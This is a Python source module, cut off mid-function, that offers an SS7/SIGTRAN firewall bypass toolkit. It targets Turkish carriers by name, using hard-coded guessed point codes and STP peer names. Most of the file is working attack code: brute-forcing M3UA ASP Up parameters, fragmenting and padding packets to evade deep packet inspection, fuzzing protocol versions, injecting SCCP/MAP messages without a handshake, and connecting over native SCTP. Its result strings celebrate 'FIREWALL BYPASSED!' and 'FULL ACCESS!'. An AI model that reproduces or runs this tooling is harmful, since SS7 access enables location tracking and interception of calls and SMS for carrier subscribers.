#!/usr/bin/env python3
"""
SS7 Firewall Bypass Module
===========================
18 bypass techniques to defeat SS7/SIGTRAN firewalls:

 1. SCTP Native - Real SCTP connection (most effective)
 2. Source Port Spoof - SIGTRAN source port whitelist bypass
 3. SCTP Multi-Homing - IP rotation bypass
 4. Direct SCCP Injection - Skip M3UA handshake, send MAP directly
 5. M3UA Fragmentation - Split messages to evade DPI
 6. M3UA Parameter Manipulation - Valid routing contexts, network appearances
 7. M2PA Protocol - Alternative SIGTRAN protocol, often not filtered
 8. Heartbeat Probe - Session state bypass
 9. Protocol Version Fuzzing - Try different M3UA versions (v0/v2/v3)
10. SUA (SCCP User Adaptation) - Alternative to M3UA
11. SCTP-over-TCP Frame - Mimic SCTP headers inside TCP
12. M3UA Routing Context Manipulation - Try all known RC values
13. SCCP GTT (Global Title Translation) Abuse - Route via GTT
14. MAP Version Downgrade - v3 -> v2 -> v1 downgrade attack
15. TCAP Dialogue ID Prediction - Hijack/predict DIDs
16. SS7 Point Code Advanced Spoofing - International PC formats
17. SCCP Hop Counter Manipulation - TTL-based filtering bypass
18. Diameter Origin-Host/Realm Rotation - Trusted identity spoof
"""

import socket
import struct
import time
import random
import sys
import os
import json
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import importlib
import importlib.util

# ============================================
# INPUT HELPERS
# ============================================

def get_input(prompt, default=None):
    if default is not None:
        data = input(f"{prompt} [{default}]: ").strip()
        return data if data else str(default)
    return input(f"{prompt}: ").strip()


def _prompt_int(prompt, default, min_value=None, max_value=None):
    while True:
        raw_value = get_input(prompt, default)
        try:
            value = int(raw_value)
        except ValueError:
            print("[-] Lutfen sayisal bir deger girin.")
            continue
        if min_value is not None and value < min_value:
            print(f"[-] Deger en az {min_value} olmalidir.")
            continue
        if max_value is not None and value > max_value:
            print(f"[-] Deger en fazla {max_value} olmalidir.")
            continue
        return value


def _is_valid_ip(value):
    try:
        socket.inet_aton(value)
        return True
    except OSError:
        return False


def _optional_import(module_name):
    spec = importlib.util.find_spec(module_name)
    if not spec:
        return None
    return importlib.import_module(module_name)


def _crc32c(data):
    """Fallback CRC32c implementation (Castagnoli)."""
    if not hasattr(_crc32c, "_table"):
        poly = 0x1EDC6F41
        table = []
        for i in range(256):
            crc = i << 24
            for _ in range(8):
                if crc & 0x80000000:
                    crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
                else:
                    crc = (crc << 1) & 0xFFFFFFFF
            table.append(crc)
        _crc32c._table = table
    crc = 0xFFFFFFFF
    for byte in data:
        crc = ((crc << 8) & 0xFFFFFFFF) ^ _crc32c._table[((crc >> 24) ^ byte) & 0xFF]
    return (~crc) & 0xFFFFFFFF

# ============================================
# M3UA CONSTANTS
# ============================================
M3UA_VERSION = 1

# Message Classes
MGMT_CLASS = 0
TRANSFER_CLASS = 1
SSNM_CLASS = 2
ASPSM_CLASS = 3
ASPTM_CLASS = 4
RKM_CLASS = 9

# Message Types
MGMT_ERROR = 0
MGMT_NOTIFY = 1
DATA = 1
ASPUP = 1
ASPUP_ACK = 4
ASPDN = 2
ASPDN_ACK = 5
HEARTBEAT = 3
HEARTBEAT_ACK = 6
ASPAC = 1
ASPAC_ACK = 3
ASPIA = 2
ASPIA_ACK = 4
REG_REQ = 1
REG_RSP = 2

# Parameter Tags
TAG_INFO_STRING = 0x0004
TAG_ROUTING_CONTEXT = 0x0006
TAG_DIAGNOSTIC_INFO = 0x0007
TAG_HEARTBEAT_DATA = 0x0009
TAG_TRAFFIC_MODE = 0x000B
TAG_ERROR_CODE = 0x000C
TAG_STATUS = 0x000D
TAG_ASP_IDENTIFIER = 0x0011
TAG_AFFECTED_PC = 0x0012
TAG_NETWORK_APPEARANCE = 0x0200
TAG_PROTOCOL_DATA = 0x0210
TAG_CORRELATION_ID = 0x0013

# Traffic Modes
TRAFFIC_OVERRIDE = 1
TRAFFIC_LOADSHARE = 2
TRAFFIC_BROADCAST = 3

# Known Turkish Telecom Point Codes (decimal)
TR_POINT_CODES = [
    # Turk Telekom
    (1, 1, 1), (1, 1, 2), (1, 1, 3), (1, 1, 4),
    (1, 2, 1), (1, 2, 2), (1, 3, 1), (1, 3, 2),
    (2, 1, 1), (2, 1, 2), (2, 2, 1), (2, 2, 2),
    (3, 1, 1), (3, 1, 2), (3, 2, 1), (3, 2, 2),
    # Common international format
    (0, 0, 1), (0, 0, 2), (0, 0, 3),
    (0, 1, 0), (0, 1, 1), (0, 1, 2),
    (0, 2, 0), (0, 2, 1), (0, 2, 2),
    # Turkcell range
    (4, 1, 1), (4, 1, 2), (4, 2, 1), (4, 2, 2),
    # Vodafone TR
    (5, 1, 1), (5, 1, 2), (5, 2, 1), (5, 2, 2),
]

# Known Routing Contexts
ROUTING_CONTEXTS = [0, 1, 2, 3, 4, 5, 10, 100, 200, 255, 256, 1000]

# ============================================
# HELPER FUNCTIONS
# ============================================

def _pc_to_int(network, cluster, member):
    """Convert point code (network-cluster-member) to integer."""
    return (network << 16) | (cluster << 8) | member


def _build_param(tag, value):
    """Build M3UA parameter TLV."""
    length = 4 + len(value)
    param = struct.pack('!HH', tag, length) + value
    # Pad to 4-byte boundary
    if length % 4:
        param += b'\x00' * (4 - length % 4)
    return param


def _build_m3ua(msg_class, msg_type, params=b''):
    """Build complete M3UA message."""
    length = 8 + len(params)
    header = struct.pack('!BBBI',
                         M3UA_VERSION,  # Version
                         0,             # Reserved
                         msg_class,     # Message Class
                         msg_type,      # Message Type
                         length)        # Length
    return header + params


def _safe_connect(ip, port, timeout=5):
    """Create TCP connection with error handling."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        return sock
    except Exception:
        return None


def _safe_send_recv(sock, data, timeout=4):
    """Send data and receive response safely."""
    try:
        sock.settimeout(timeout)
        sock.send(data)
        resp = sock.recv(4096)
        return resp
    except socket.timeout:
        return None
    except ConnectionResetError:
        return b'RESET'
    except BrokenPipeError:
        return b'BROKEN'
    except Exception:
        return None


def _parse_m3ua_response(resp):
    """Parse M3UA response and return details."""
    if not resp or len(resp) < 8:
        return None
    
    if resp == b'RESET':
        return {'type': 'RESET', 'desc': 'Connection reset'}
    if resp == b'BROKEN':
        return {'type': 'BROKEN', 'desc': 'Broken pipe'}
    
    try:
        version = resp[0]
        msg_class = resp[2]
        msg_type = resp[3]
        length = struct.unpack('!I', resp[4:8])[0]
        
        result = {
            'type': 'M3UA',
            'version': version,
            'class': msg_class,
            'msg_type': msg_type,
            'length': length,
            'raw_len': len(resp),
            'desc': ''
        }
        
        # Decode message
        if msg_class == ASPSM_CLASS:
            if msg_type == ASPUP_ACK:
                result['desc'] = 'ASP Up Ack - FIREWALL BYPASSED!'
            elif msg_type == ASPDN_ACK:
                result['desc'] = 'ASP Down Ack'
            elif msg_type == HEARTBEAT_ACK:
                result['desc'] = 'Heartbeat Ack'
            else:
                result['desc'] = f'ASPSM msg_type={msg_type}'
        elif msg_class == ASPTM_CLASS:
            if msg_type == ASPAC_ACK:
                result['desc'] = 'ASP Active Ack - FULL ACCESS!'
            elif msg_type == ASPIA_ACK:
                result['desc'] = 'ASP Inactive Ack'
            else:
                result['desc'] = f'ASPTM msg_type={msg_type}'
        elif msg_class == MGMT_CLASS:
            if msg_type == MGMT_ERROR:
                result['desc'] = 'M3UA Error'
                # Parse error code
                if len(resp) > 12:
                    params = resp[8:]
                    if len(params) >= 8:
                        tag = struct.unpack('!H', params[0:2])[0]
                        if tag == TAG_ERROR_CODE:
                            err = struct.unpack('!I', params[4:8])[0]
                            error_names = {
                                1: 'Invalid Version',
                                3: 'Unsupported Message Class',
                                4: 'Unsupported Message Type',
                                5: 'Unsupported Traffic Mode',
                                6: 'Unexpected Message',
                                7: 'Protocol Error',
                                13: 'Refused - Management Blocking',
                                14: 'ASP Identifier Required',
                                15: 'Invalid ASP Identifier',
                                17: 'Invalid Routing Context',
                                19: 'No Configured AS for ASP',
                            }
                            result['error_code'] = err
                            result['error_name'] = error_names.get(err, f'Unknown({err})')
                            result['desc'] = f'M3UA Error: {result["error_name"]}'
            elif msg_type == MGMT_NOTIFY:
                result['desc'] = 'M3UA Notify'
        elif msg_class == TRANSFER_CLASS:
            result['desc'] = 'M3UA DATA - Transfer message received!'
        elif msg_class == RKM_CLASS:
            result['desc'] = 'Routing Key Management response'
        else:
            result['desc'] = f'Unknown class={msg_class} type={msg_type}'
        
        return result
    except Exception as e:
        return {'type': 'PARSE_ERROR', 'desc': str(e)}


# ============================================
# BYPASS TECHNIQUE 1: M3UA Parameter Manipulation
# ============================================

def bypass_m3ua_params(ip, port, timeout=5):
    """
    Try ASP Up with different parameter combinations.
    Some firewalls only accept ASP Up with specific routing contexts
    or ASP identifiers.
    """
    results = []
    t = min(timeout, 3)  # Max 3s per attempt for speed
    reset_count = 0
    
    # Technique 1a: ASP Up with ASP Identifier (reduced set)
    for asp_id in [1, 100, 65535]:
        sock = _safe_connect(ip, port, t)
        if not sock:
            continue
        
        params = _build_param(TAG_ASP_IDENTIFIER, struct.pack('!I', asp_id))
        asp_up = _build_m3ua(ASPSM_CLASS, ASPUP, params)
        resp = _safe_send_recv(sock, asp_up, t)
        parsed = _parse_m3ua_response(resp)
        
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': f'ASP Up + ASP ID={asp_id}',
                'success': True,
                'response': parsed['desc'],
                'level': 'CRITICAL'
            })
            # Try ASP Active too
            for rc in ROUTING_CONTEXTS[:3]:
                rc_param = _build_param(TAG_ROUTING_CONTEXT, struct.pack('!I', rc))
                tm_param = _build_param(TAG_TRAFFIC_MODE, struct.pack('!I', TRAFFIC_OVERRIDE))
                asp_active = _build_m3ua(ASPTM_CLASS, ASPAC, rc_param + tm_param)
                resp2 = _safe_send_recv(sock, asp_active, t)
                parsed2 = _parse_m3ua_response(resp2)
                if parsed2 and parsed2.get('class') == ASPTM_CLASS and parsed2.get('msg_type') == ASPAC_ACK:
                    results.append({
                        'technique': f'ASP Active + RC={rc}',
                        'success': True,
                        'response': parsed2['desc'],
                        'level': 'CRITICAL'
                    })
                    break
            try:
                sock.close()
            except Exception:
                pass
            return results  # Found a way in!
        elif parsed and parsed.get('type') == 'RESET':
            reset_count += 1
        elif parsed and parsed.get('error_code'):
            results.append({
                'technique': f'ASP Up + ASP ID={asp_id}',
                'success': False,
                'response': parsed['desc'],
                'level': 'INFO',
                'error_code': parsed['error_code']
            })
        try:
            sock.close()
        except Exception:
            pass
    
    # If all attempts get reset, skip info string (firewall pattern detected)
    if reset_count >= 3:
        results.append({
            'technique': 'M3UA Params (all reset)',
            'success': False,
            'response': 'Firewall tum ASP Up denemelerini resetliyor',
            'level': 'INFO'
        })
        return results
    
    # Technique 1b: ASP Up with Info String (top 5 most likely)
    peer_names = [
        b'TT-STP-01',    # Turk Telekom STP
        b'TCELL-STP',    # Turkcell
        b'STP-01',       # Generic STP
        b'SGW-01',       # Generic SGW
        b'HLR-01',       # Generic HLR
    ]
    for name in peer_names:
        sock = _safe_connect(ip, port, t)
        if not sock:
            continue
        
        params = _build_param(TAG_INFO_STRING, name)
        asp_up = _build_m3ua(ASPSM_CLASS, ASPUP, params)
        resp = _safe_send_recv(sock, asp_up, t)
        parsed = _parse_m3ua_response(resp)
        
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': f'ASP Up + Info="{name.decode()}"',
                'success': True,
                'response': parsed['desc'],
                'level': 'CRITICAL'
            })
            try:
                sock.close()
            except Exception:
                pass
            return results
        try:
            sock.close()
        except Exception:
            pass
    
    # Technique 1c: ASP Up with Network Appearance (reduced)
    for na in [0, 1, 2, 100]:
        sock = _safe_connect(ip, port, t)
        if not sock:
            continue
        
        params = _build_param(TAG_NETWORK_APPEARANCE, struct.pack('!I', na))
        asp_up = _build_m3ua(ASPSM_CLASS, ASPUP, params)
        resp = _safe_send_recv(sock, asp_up, timeout)
        parsed = _parse_m3ua_response(resp)
        
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': f'ASP Up + Network Appearance={na}',
                'success': True,
                'response': parsed['desc'],
                'level': 'CRITICAL'
            })
            try:
                sock.close()
            except Exception:
                pass
            return results
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 2: M2PA Protocol
# ============================================

def bypass_m2pa(ip, port=None, timeout=5):
    """
    Try M2PA (MTP2 Peer-to-Peer Adaptation) on port 3565 or given port.
    M2PA is often less filtered than M3UA because it's less common.
    """
    results = []
    test_ports = [port] if port else [3565, 5000, 5001, 5060, 2906, 2904]
    
    for p in test_ports:
        if not p:
            continue
        sock = _safe_connect(ip, p, timeout)
        if not sock:
            continue
        
        # M2PA Link Status message (Proving)
        # Version=1, Spare=0, Class=11(M2PA), Type=2(Link Status)
        m2pa_header = struct.pack('!BBBB I',
                                   1,      # Version
                                   0,      # Spare
                                   11,     # Message Class (M2PA)
                                   2,      # Message Type (Link Status)
                                   20)     # Length
        # BSN, FSN
        m2pa_data = struct.pack('!I I I',
                                 0x00FFFFFF,  # BSN
                                 0x00FFFFFF,  # FSN
                                 3)           # Status: Proving Normal
        
        resp = _safe_send_recv(sock, m2pa_header + m2pa_data, timeout)
        parsed = _parse_m3ua_response(resp)
        
        if resp and resp not in (b'RESET', b'BROKEN') and len(resp) >= 8:
            # Check if M2PA response
            if resp[2] == 11:  # M2PA class
                results.append({
                    'technique': f'M2PA Link Status (port {p})',
                    'success': True,
                    'response': f'M2PA yanit ({len(resp)} bytes)',
                    'level': 'HIGH'
                })
            else:
                results.append({
                    'technique': f'M2PA (port {p})',
                    'success': False,
                    'response': f'Yanit: class={resp[2]} type={resp[3]}',
                    'level': 'INFO'
                })
        elif resp == b'RESET':
            results.append({
                'technique': f'M2PA (port {p})',
                'success': False,
                'response': 'Reset (firewall)',
                'level': 'INFO'
            })
        
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 3: SUA (SCCP User Adaptation)
# ============================================

def bypass_sua(ip, port=None, timeout=5):
    """
    Try SUA (SCCP User Adaptation Layer) - RFC 3868.
    SUA carries SCCP directly, bypassing MTP3.
    Some firewalls focus on M3UA and miss SUA traffic.
    """
    results = []
    test_ports = [port] if port else [14001, 2905, 2904]
    
    for p in test_ports:
        if not p:
            continue
        sock = _safe_connect(ip, p, timeout)
        if not sock:
            continue
        
        # SUA ASP Up message
        # Version=1, Reserved=0, Class=3(ASPSM), Type=1(ASP Up)
        # SUA uses same ASPSM classes as M3UA but with SUA-specific parameters
        sua_asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
        
        resp = _safe_send_recv(sock, sua_asp_up, timeout)
        parsed = _parse_m3ua_response(resp)
        
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': f'SUA ASP Up (port {p})',
                'success': True,
                'response': parsed['desc'],
                'level': 'CRITICAL'
            })
            
            # Try SUA CLDT (Connectionless Data Transfer)
            # This would carry SCCP UnitData
            try:
                sock.close()
            except Exception:
                pass
            return results
        elif parsed and parsed.get('error_code'):
            results.append({
                'technique': f'SUA (port {p})',
                'success': False,
                'response': parsed['desc'],
                'level': 'INFO'
            })
        
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 4: M3UA Fragmentation
# ============================================

def bypass_fragmentation(ip, port, timeout=5):
    """
    Send M3UA ASP Up in small TCP segments.
    Some DPI engines can't reassemble fragmented M3UA.
    """
    results = []
    
    # Build normal ASP Up
    asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
    
    # Method 1: Send byte by byte (evades basic DPI)
    sock = _safe_connect(ip, port, min(timeout, 3))
    if sock:
        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            for i in range(len(asp_up)):
                sock.send(asp_up[i:i+1])
                time.sleep(0.02)  # 20ms between bytes
            
            # Receive response (removed duplicate recv call)
            sock.settimeout(timeout)
            try:
                resp = sock.recv(4096)
            except socket.timeout:
                resp = None
            except Exception:
                resp = None
            
            parsed = _parse_m3ua_response(resp)
            if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                results.append({
                    'technique': 'Byte-by-byte fragmentation',
                    'success': True,
                    'response': parsed['desc'],
                    'level': 'HIGH'
                })
            elif parsed and parsed.get('type') != 'RESET':
                results.append({
                    'technique': 'Byte-by-byte fragmentation',
                    'success': False,
                    'response': parsed.get('desc', 'Yanit var'),
                    'level': 'INFO'
                })
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
    
    # Method 2: Split header and body
    sock = _safe_connect(ip, port, timeout)
    if sock:
        try:
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            # Send first 4 bytes (version, reserved, class, type)
            sock.send(asp_up[:4])
            time.sleep(0.2)
            # Send remaining (length)
            sock.send(asp_up[4:])
            
            sock.settimeout(timeout)
            try:
                resp = sock.recv(4096)
            except Exception:
                resp = None
            
            parsed = _parse_m3ua_response(resp)
            if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                results.append({
                    'technique': 'Header/body split',
                    'success': True,
                    'response': parsed['desc'],
                    'level': 'HIGH'
                })
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
    
    # Method 3: Prepend garbage bytes (confuse DPI parser)
    sock = _safe_connect(ip, port, timeout)
    if sock:
        try:
            # Send some non-M3UA bytes first, then real ASP Up
            garbage = bytes([0x00] * 3)  # 3 null bytes (misalign DPI parser)
            sock.send(garbage + asp_up)
            
            sock.settimeout(timeout)
            try:
                resp = sock.recv(4096)
            except Exception:
                resp = None
            
            parsed = _parse_m3ua_response(resp)
            if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                results.append({
                    'technique': 'Garbage prefix bypass',
                    'success': True,
                    'response': parsed['desc'],
                    'level': 'HIGH'
                })
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 5: Slow Handshake (Timing)
# ============================================

def bypass_slow_handshake(ip, port, timeout=10):
    """
    Slow M3UA handshake to evade rate-limiting firewalls.
    Some firewalls timeout before the message is complete.
    """
    results = []
    
    sock = _safe_connect(ip, port, min(timeout, 4))
    if not sock:
        return results
    
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Wait 1.5 seconds after connect before sending anything
        time.sleep(1.5)
        
        # Build ASP Up with routing context
        params = _build_param(TAG_ROUTING_CONTEXT, struct.pack('!I', 1))
        asp_up = _build_m3ua(ASPSM_CLASS, ASPUP, params)
        
        # Send in 4-byte chunks with 0.3s delay
        chunk_size = 4
        for i in range(0, len(asp_up), chunk_size):
            sock.send(asp_up[i:i+chunk_size])
            time.sleep(0.3)
        
        sock.settimeout(4)
        try:
            resp = sock.recv(4096)
        except Exception:
            resp = None
        
        parsed = _parse_m3ua_response(resp)
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': 'Slow handshake (1.5s delay + 0.3s/4B)',
                'success': True,
                'response': parsed['desc'],
                'level': 'HIGH'
            })
    except Exception:
        pass
    
    try:
        sock.close()
    except Exception:
        pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 6: Direct SCCP/MAP Injection
# ============================================

def bypass_direct_sccp(ip, port, timeout=5):
    """
    Send M3UA DATA directly without ASP Up handshake.
    Contains SCCP UnitData with MAP SRI (SendRoutingInfo).
    Some implementations process DATA even without ASP Up.
    """
    results = []
    
    for opc_tuple in TR_POINT_CODES[:4]:  # Try first 4 point codes
        dpc_tuple = random.choice(TR_POINT_CODES[:4])
        opc = _pc_to_int(*opc_tuple)
        dpc = _pc_to_int(*dpc_tuple)
        
        sock = _safe_connect(ip, port, timeout)
        if not sock:
            continue
        
        # Build SCCP UnitData (UDT) with MAP begin
        # Called Party Address (GT format)
        called_party = b'\x43'   # Address Indicator: GT+SSN+Route on GT
        called_party += b'\x06'  # SSN: HLR (6)
        called_party += b'\x00\x11'  # GT: Translation Type
        
        # Calling Party Address
        calling_party = b'\x43'   # Address Indicator
        calling_party += b'\x08'  # SSN: MSC (8)
        calling_party += b'\x00\x12'  # GT
        
        # MAP Begin (minimal TCAP)
        map_begin = b'\x62'   # TCAP Begin tag
        otid_data = struct.pack('!I', random.randint(1, 0xFFFFFFFF))
        dialogue = b'\x6B\x02\x06\x00'  # Dialogue portion (minimal)
        map_content = b'\x48' + bytes([len(otid_data)]) + otid_data + dialogue
        map_begin += bytes([len(map_content)]) + map_content
        
        # SCCP UDT - pointer'lar dinamik hesaplaniyor
        # Pointer to Called Party: 3 byte sonra (3 pointer byte'indan sonra)
        # Pointer to Calling Party: 3 + len(called) byte sonra
        # Pointer to Data: 3 + len(called) + len(calling) byte sonra
        called_len = len(called_party)
        calling_len = len(calling_party)
        
        ptr_called = 3  # 3 pointer byte'i atlat
        ptr_calling = ptr_called + 1 + called_len - 1  # called length byte + data, offset -1 cunku pointer relative
        ptr_data = ptr_calling + 1 + calling_len - 1
        
        sccp_udt = b'\x09'    # Message Type: UDT (9)
        sccp_udt += b'\x00'   # Protocol Class: 0
        sccp_udt += bytes([ptr_called])   # Pointer to Called Party
        sccp_udt += bytes([ptr_calling])  # Pointer to Calling Party (relative)
        sccp_udt += bytes([ptr_data])     # Pointer to Data (relative)
        sccp_udt += bytes([called_len]) + called_party
        sccp_udt += bytes([calling_len]) + calling_party
        sccp_udt += bytes([len(map_begin)]) + map_begin
        
        # Build M3UA Protocol Data parameter
        proto_data = struct.pack('!I', opc)     # OPC
        proto_data += struct.pack('!I', dpc)    # DPC
        proto_data += struct.pack('!B', 3)      # SI: SCCP
        proto_data += struct.pack('!B', 0)      # NI: International
        proto_data += struct.pack('!B', 0)      # MP
        proto_data += struct.pack('!B', random.randint(0, 15))  # SLS
        proto_data += sccp_udt
        
        params = _build_param(TAG_PROTOCOL_DATA, proto_data)
        m3ua_data = _build_m3ua(TRANSFER_CLASS, DATA, params)
        
        resp = _safe_send_recv(sock, m3ua_data, timeout)
        parsed = _parse_m3ua_response(resp)
        
        if resp and resp not in (b'RESET', b'BROKEN', None):
            if parsed:
                if parsed.get('class') == TRANSFER_CLASS:
                    results.append({
                        'technique': f'Direct SCCP (OPC={opc_tuple})',
                        'success': True,
                        'response': f'DATA yanit! {parsed["desc"]}',
                        'level': 'CRITICAL'
                    })
                    try:
                        sock.close()
                    except Exception:
                        pass
                    return results
                elif parsed.get('class') == MGMT_CLASS:
                    results.append({
                        'technique': f'Direct SCCP (OPC={opc_tuple})',
                        'success': False,
                        'response': parsed['desc'],
                        'level': 'INFO'
                    })
                else:
                    results.append({
                        'technique': f'Direct SCCP (OPC={opc_tuple})',
                        'success': False,
                        'response': f'Bilinmeyen yanit: {parsed.get("desc", "")}',
                        'level': 'INFO'
                    })
        
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 7: Heartbeat Probe
# ============================================

def bypass_heartbeat(ip, port, timeout=5):
    """
    Send M3UA Heartbeat instead of ASP Up.
    Some implementations respond to heartbeat even without session.
    """
    results = []
    
    sock = _safe_connect(ip, port, timeout)
    if not sock:
        return results
    
    # M3UA Heartbeat with data
    hb_data = struct.pack('!I', int(time.time()))  # Timestamp as heartbeat data
    params = _build_param(TAG_HEARTBEAT_DATA, hb_data)
    heartbeat = _build_m3ua(ASPSM_CLASS, HEARTBEAT, params)
    
    resp = _safe_send_recv(sock, heartbeat, timeout)
    parsed = _parse_m3ua_response(resp)
    
    if parsed:
        if parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == HEARTBEAT_ACK:
            results.append({
                'technique': 'M3UA Heartbeat',
                'success': True,
                'response': 'Heartbeat Ack - Session yonetimi zayif!',
                'level': 'HIGH'
            })
            
            # If heartbeat works, try ASP Up right after
            asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
            resp2 = _safe_send_recv(sock, asp_up, timeout)
            parsed2 = _parse_m3ua_response(resp2)
            if parsed2 and parsed2.get('class') == ASPSM_CLASS and parsed2.get('msg_type') == ASPUP_ACK:
                results.append({
                    'technique': 'Heartbeat -> ASP Up',
                    'success': True,
                    'response': 'ASP Up Ack after Heartbeat!',
                    'level': 'CRITICAL'
                })
        elif parsed.get('type') == 'M3UA':
            results.append({
                'technique': 'M3UA Heartbeat',
                'success': False,
                'response': parsed['desc'],
                'level': 'INFO'
            })
    
    try:
        sock.close()
    except Exception:
        pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 8: Version Fuzzing
# ============================================

def bypass_version_fuzz(ip, port, timeout=5):
    """
    Try different M3UA version numbers.
    Version 1 is standard but older implementations may accept 0 or 2.
    """
    results = []
    
    for version in [0, 2, 3, 255]:
        sock = _safe_connect(ip, port, timeout)
        if not sock:
            continue
        
        # Custom ASP Up with different version
        length = 8
        msg = struct.pack('!BBBB I',
                          version,       # Non-standard version
                          0,             # Reserved
                          ASPSM_CLASS,   # ASP SM
                          ASPUP,         # ASP Up
                          length)
        
        resp = _safe_send_recv(sock, msg, timeout)
        parsed = _parse_m3ua_response(resp)
        
        if parsed and parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
            results.append({
                'technique': f'M3UA Version {version}',
                'success': True,
                'response': f'ASP Up Ack (version={version}) - Versiyon kontrolu yok!',
                'level': 'HIGH'
            })
        elif parsed and parsed.get('error_code') == 1:
            # Invalid version - at least it responds
            results.append({
                'technique': f'M3UA Version {version}',
                'success': False,
                'response': 'Invalid Version error (yanit var)',
                'level': 'LOW'
            })
        
        try:
            sock.close()
        except Exception:
            pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 9: Multi-port Scan  
# ============================================

def bypass_multiport(ip, timeout=4):
    """
    Scan all SIGTRAN-related ports for any that might be less protected.
    """
    results = []
    
    ports = [
        (2904, 'M2UA'),
        (2905, 'M3UA'),
        (2906, 'M2PA'),
        (2907, 'M3UA-alt'),
        (2908, 'SIGTRAN'),
        (3565, 'M2PA-alt'),
        (3868, 'Diameter'),
        (7626, 'SUA'),
        (9900, 'IUA'),
        (14001, 'SUA-alt'),
    ]
    
    open_ports = []
    for p, name in ports:
        sock = _safe_connect(ip, p, timeout)
        if sock:
            open_ports.append((p, name))
            
            # Quick M3UA probe on each open port
            asp_up = _build_m3ua(ASPSM_CLASS, ASPUP)
            resp = _safe_send_recv(sock, asp_up, 3)
            parsed = _parse_m3ua_response(resp)
            
            status = 'timeout'
            if parsed:
                if parsed.get('class') == ASPSM_CLASS and parsed.get('msg_type') == ASPUP_ACK:
                    status = 'ASP Up Ack!'
                    results.append({
                        'technique': f'Port {p} ({name})',
                        'success': True,
                        'response': f'ASP Up Ack on {name} port!',
                        'level': 'CRITICAL'
                    })
                elif parsed.get('type') == 'RESET':
                    status = 'reset (firewall)'
                elif parsed.get('type') == 'M3UA':
                    status = parsed.get('desc', 'M3UA yanit')
            
            results.append({
                'technique': f'Port {p} ({name})',
                'success': False,
                'response': f'TCP acik - {status}',
                'level': 'LOW',
                'port': p
            })
            
            try:
                sock.close()
            except Exception:
                pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 10: SCTP-like Framing
# ============================================

def bypass_sctp_frame(ip, port, timeout=5):
    """
    Some SIGTRAN endpoints expect SCTP framing even over TCP (SCTP-over-TCP tunnels).
    Try wrapping M3UA in SCTP-like INIT chunk.
    """
    results = []
    
    sock = _safe_connect(ip, port, timeout)
    if not sock:
        return results
    
    # SCTP common header (12 bytes)
    sctp_header = struct.pack('!HHII',
                            port,    # Source Port
                            port,    # Destination Port
                            0,       # Verification Tag (0 for INIT)
                            0)       # Checksum (0 placeholder)
    # INIT chunk (20 bytes)
    init_tag = random.randint(1, 0xFFFFFFFF)
    init_tsn = random.randint(1, 0xFFFFFFFF)
    init_chunk = struct.pack('!BBHIHHI',
                              1,          # Chunk Type: INIT
                              0,          # Chunk Flags
                              20,         # Chunk Length
                              init_tag,   # Initiate Tag
                              65535,      # A-RWND
                              1,          # Num Outbound Streams
                              1,          # Num Inbound Streams
                              init_tsn)   # Initial TSN
    
    resp = _safe_send_recv(sock, sctp_header + init_chunk, timeout)
    
    if resp and resp not in (b'RESET', b'BROKEN') and len(resp) >= 4:
        results.append({
            'technique': 'SCTP-over-TCP INIT',
            'success': True,
            'response': f'SCTP yanit ({len(resp)} bytes)',
            'level': 'MEDIUM'
        })
    
    try:
        sock.close()
    except Exception:
        pass
    
    return results


# ============================================
# BYPASS TECHNIQUE 11: Native SCTP (Real bypass)
# ============================================

def bypass_native_sctp(ip, port, timeout=5):
    """
    Real SCTP connection using raw sockets or pysctp.
    This is the REAL bypass - SS7 firewalls often only filter TCP
    but the actual SIGTRAN service runs on SCTP.
    
    SCTP is the native transport for M3UA/SIGTRAN.
    Many firewalls have TCP rules but miss SCTP entirely because:
    - iptables/nftables need explicit SCTP rules
    - Many DPI engines don't inspect SCTP
    - Cloud firewalls (AWS SG) often lack SCTP support
    """
    results = []
    
    # Method 1: Try pysctp library (best option)
    pysctp = _optional_import("sctp")
    if pysctp:
        try:
            sk = pysctp.sctpsocket_tcp(socket.AF_INET)
            sk.settimeout(timeout)
            sk.connect((ip, port))

            results.append({
                'technique': f'SCTP Native Connect (port {port})',
                'success': True,
                'response': 'SCTP baglanti BASARILI! Firewall SCTP filtrelemiyor!',
                'level': 'CRITICAL'
            })

            # Send M3UA ASP Up over SCTP
